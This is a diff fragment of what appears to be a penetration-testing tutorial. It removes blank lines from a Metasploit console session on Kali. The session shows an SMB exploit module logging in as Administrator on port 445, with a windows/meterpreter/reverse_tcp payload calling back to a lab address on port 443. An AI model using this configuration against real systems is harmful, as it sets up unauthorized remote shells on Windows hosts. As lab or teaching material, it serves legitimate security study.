@@ -66,8 +66,6 @@ root@kali:~# msfconsole
 ## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
 ##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
                                       ##
-
-
        [ metasploit v4.2.0-dev [core:4.2 api:1.0]
 + -- --[ 787 exploits - 425 auxiliary - 128 post
 + -- --[ 238 payloads - 27 encoders - 8 nops
@@ -102,8 +100,6 @@ Module options:
    RPORT    445              yes       Set the SMB service port
    SMBPass                   no        The password for the specified username
    SMBUser  Administrator    yes       The username to authenticate as
-
-
 Payload options (windows/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
@@ -111,8 +107,6 @@ Payload options (windows/meterpreter/reverse_tcp):
    EXITFUNC  thread           yes       Exit technique: seh, thread, process
    LHOST     192.168.57.133   yes       The local address
    LPORT     443              yes       The local port
-
-
 Exploit target:
 
    Id  Name
